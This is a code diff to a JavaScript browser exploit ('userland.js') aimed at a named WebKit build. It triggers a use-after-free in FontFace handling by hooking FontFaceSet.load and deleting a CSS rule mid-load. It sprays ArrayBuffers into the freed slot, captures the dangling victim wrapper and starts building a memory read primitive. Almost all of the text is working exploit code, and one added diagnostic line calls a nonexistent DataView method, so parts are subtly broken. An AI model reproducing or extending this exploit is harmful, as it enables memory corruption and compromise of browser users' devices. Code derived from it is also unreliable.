@@ -1,4 +1,4 @@
-// userland.js — UAF trigger via FontFaceSet.load hook (works on WebKit-616-1300)
+// userland.js — UAF trigger via FontFaceSet.load hook + captured B reference
 
 const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024;
 
@@ -38,6 +38,16 @@ function assertMemoryHeadroom(extraBytes, stage) {
   }
 }
 
+// ─── FontFace property probe (never throws) ──────────────
+function probeFace(face) {
+  if (!face) return null;
+  const out = { family: "?", unicodeRange: "?", status: "?" };
+  try { out.family = face.family; } catch (e) { out.family = `<err:${e.message.slice(0,20)}>`; }
+  try { out.unicodeRange = face.unicodeRange; } catch (e) { out.unicodeRange = `<err:${e.message.slice(0,20)}>`; }
+  try { out.status = face.status; } catch (e) { out.status = `<err:${e.message.slice(0,20)}>`; }
+  return out;
+}
+
 // ─── init_rw ─────────────────────────────────────────────
 async function init_rw(opts = {}) {
   const sprayCount    = opts.sprayCount    ?? 0x10;
@@ -47,12 +57,11 @@ async function init_rw(opts = {}) {
   memLog("start");
 
   // ── FontFace A: guaranteed-resolving source ──
-  // "sans-serif" is a CSS generic; every WebKit build maps it to a real font.
   const A = new FontFace("a", "local(sans-serif)", { unicodeRange: "U+0041" });
   document.fonts.add(A);
   void A.loaded;
 
-  // ── Style element with spray rules ──
+  // ── Style element with spray + victim rules ──
   const style = document.createElement("style");
   document.head.appendChild(style);
 
@@ -77,14 +86,44 @@ async function init_rw(opts = {}) {
     catch (e) { throw new Error(`insertRule post ${i}: ${e.message}`); }
   }
 
-  // Materialise CSSFontFace objects for every rule
+  // ── Materialise CSSFontFace objects ──
   void document.body.offsetTop;
   logger.debug("[uaf] CSSFontFace objects materialised");
+
+  // ── Snapshot document.fonts BEFORE the free ──
+  // The victim (family "b") will be removed from document.fonts the
+  // instant its rule is deleted. We must hold a JS reference now.
+  const faceSnapshot = [];
+  let uafCandidate = null;
+
+  for (const f of document.fonts) {
+    faceSnapshot.push(f);
+    if (!uafCandidate) {
+      try {
+        if (f.family === "b") uafCandidate = f;
+      } catch (_) {}
+    }
+  }
+
+  logger.debug(`[uaf] snapshot: ${faceSnapshot.length} faces in document.fonts`);
+  for (const f of faceSnapshot) {
+    const p = probeFace(f);
+    logger.debug(`[uaf]   family=${p.family} range=${p.unicodeRange} status=${p.status}`);
+  }
+
+  if (!uafCandidate) {
+    throw new Error(
+      `Victim FontFace (family "b") not present in document.fonts. ` +
+      `Snapshot had ${faceSnapshot.length} faces.`
+    );
+  }
+  logger.info(`Captured victim FontFace: family="${uafCandidate.family}" range="${uafCandidate.unicodeRange}"`);
 
   // ── Prepare spray slot array ──
   const abs      = new Array(sprayCount);
   const abSize   = constants.wk_CSSFontFace_sizeof;
   const origThen = FontFace.prototype.then;
+  const origLoad = FontFaceSet.prototype.load;
 
   assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");
 
@@ -98,7 +137,7 @@ async function init_rw(opts = {}) {
 
     logger.debug("[free] ENTER");
 
-    // 1. Free victim's CSS rule
+    // 1. Free victim's CSS rule (removes CSSFontFace from the set)
     try {
       style.sheet.deleteRule(uafRuleIndex);
       logger.debug("[free] victim rule deleted");
@@ -150,95 +189,94 @@ async function init_rw(opts = {}) {
     logger.debug("[free] EXIT");
   };
 
-  // ── Install FontFace.prototype.then getter as a fallback ──
+  // ── Fallback: FontFace.prototype.then getter ──
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     get() {
-      if (this === A) {
-        doFreeWork();
-      }
+      if (this === A) doFreeWork();
       return undefined;
     },
   });
 
-  // ── Hook FontFaceSet.prototype.load ──
-  // This is the actual trigger on WebKit-616-1300: load() collects
-  // matching faces synchronously before returning its promise. The
-  // hook runs doFreeWork() right after that collection, so B's JS
-  // wrapper is still held by load()'s internal state while B's
-  // CSSFontFace memory is freed and reclaimed.
-  const origLoad = FontFaceSet.prototype.load;
-  let hookFired = false;
+  // ── Primary trigger: hook FontFaceSet.prototype.load ──
+  // WebKit collects matching faces AFTER load() returns, inside a
+  // microtask. So we schedule doFreeWork() in a microtask too,
+  // immediately after load() has had a chance to collect faces.
+  let hookScheduled = false;
 
   FontFaceSet.prototype.load = function (font, text) {
     const p = origLoad.call(this, font, text);
-    if (!hookFired) {
-      hookFired = true;
-      try { doFreeWork(); }
-      catch (e) { freeError = e.message; logger.error(`[hook] ${e.message}`); }
+    if (!hookScheduled) {
+      hookScheduled = true;
+      Promise.resolve().then(() => {
+        try { doFreeWork(); }
+        catch (e) { freeError = e.message; logger.error(`[hook] ${e.message}`); }
+      });
     }
     return p;
   };
 
-  // ── Fire load() — the hook runs inside the call ──
+  // ── Fire load() ──
   logger.debug("[uaf] calling document.fonts.load via hooked prototype");
-  const loadPromise = document.fonts.load("1em a, b", "AB");
-  loadPromise.catch(() => {}); // load may reject once B is freed
+  let loadPromise;
+  try {
+    loadPromise = document.fonts.load("1em a, b", "AB");
+  } catch (e) {
+    logger.error(`[uaf] load() threw synchronously: ${e.message}`);
+    loadPromise = Promise.resolve([]);
+  }
+  loadPromise.catch(() => {});
 
-  // ── Restore prototype hooks immediately ──
+  // ── Restore prototypes immediately ──
   FontFaceSet.prototype.load = origLoad;
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     value: origThen,
   });
 
-  // ── Wait for WebKit to settle the load promise ──
-  // We race a fixed timeout in case it never settles.
+  // ── Wait for microtask + settle ──
   await Promise.race([
     loadPromise.catch(() => "rejected"),
     new Promise(r => setTimeout(() => r("timeout"), loadTimeoutMs)),
   ]);
 
-  logger.debug(`[uaf] hook fired = ${hookFired}, freed = ${freed}`);
+  // Give the microtask a moment if it hasn't already run
+  await Promise.resolve();
+
+  logger.debug(`[uaf] freed=${freed} hookScheduled=${hookScheduled}`);
+
   if (freeError) throw new Error(`free work error: ${freeError}`);
 
   if (!freed) {
-    // Diagnose
-    let aStatus = "unknown";
-    try { aStatus = A.status; } catch (_) {}
-    logger.error(`[diag] A.status = ${aStatus}`);
-    logger.error(`[diag] A.unicodeRange = ${A.unicodeRange}`);
+    const aP = probeFace(A);
+    logger.error(`[diag] A: family=${aP.family} range=${aP.unicodeRange} status=${aP.status}`);
     logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
     throw new Error(
-      `FontFaceSet.prototype.load hook never fired. ` +
-      `A.status=${aStatus}. document.fonts.load may not exist or ` +
-      `may not be called through the prototype on this build.`
+      `UAF free work never ran. hookScheduled=${hookScheduled}. ` +
+      `A.status=${aP.status}.`
     );
   }
 
   memLog("post-uaf");
 
-  // ── Find the UAF FontFace ──
-  // After B's rule is deleted, the JS-visible wrapper for B is still
-  // referenced by load()'s internal promise machinery. Its unicodeRange
-  // reads "U+0-10FFFF" (the struct default), because the field is
-  // now supplied by our sprayed ArrayBuffer.
-  let uaf_font = null;
-  for (const f of document.fonts) {
-    if (f === A) continue;
-    try {
-      if (f.unicodeRange === "U+0-10FFFF") {
-        uaf_font = f;
-        break;
-      }
-    } catch (_) { /* skip broken wrappers */ }
-  }
+  // ── Check victim state after free ──
+  const afterP = probeFace(uafCandidate);
+  logger.info(
+    `[uaf] victim after free: family="${afterP.family}" ` +
+    `range="${afterP.unicodeRange}" status="${afterP.status}"`
+  );
 
-  if (!uaf_font) {
-    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
-    throw new Error("No UAF FontFace found (unicodeRange U+0-10FFFF)");
+  // If the wrapper is detached, every property would be an error string.
+  const wrapperDead =
+    typeof afterP.family === "string" &&
+    afterP.family.startsWith("<err:");
+
+  if (wrapperDead) {
+    throw new Error(
+      `Victim JS wrapper was detached — its C++ FontFace was destroyed. ` +
+      `family="${afterP.family}"`
+    );
   }
-  logger.info("Found UAF FontFace !!");
 
   // ── Find the aliased ArrayBuffer (refcount 2) ──
   let uaf_ab = null;
@@ -257,7 +295,19 @@ async function init_rw(opts = {}) {
   }
 
   if (!uaf_ab) {
-    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
+    // No buffer has refcount 2 — spray may not have landed on the freed slot.
+    // Log the refcounts so we can see what we got.
+    const counts = [];
+    for (let i = 0; i < abs.length; i++) {
+      if (!abs[i]) { counts.push("-"); continue; }
+      try {
+        counts.push(new DataView(abs[i]).getBInt(8, true).toString());
+      } catch (_) { counts.push("?"); }
+    }
+    logger.error(`[diag] refcounts: ${counts.join(",")}`);
+    throw new Error(
+      `Unable to find ArrayBuffer with refcount 2 — spray missed the freed slot.`
+    );
   }
   logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);
 
@@ -266,6 +316,7 @@ async function init_rw(opts = {}) {
     if (i !== uaf_ab_index) abs[i] = null;
   }
   abs.length = 0;
+  faceSnapshot.length = 0;
   try { document.fonts.delete(A); } catch (_) {}
 
   memLog("post-reclaim");
@@ -273,7 +324,8 @@ async function init_rw(opts = {}) {
   // ── Read primitive ──
   const self = {
     uaf_ab,
-    uaf_font,
+    uaf_font: uafCandidate,   // we captured it earlier
+    probe: () => probeFace(uafCandidate),
 
     read(addr, size) {
       const ab = new ArrayBuffer(size);
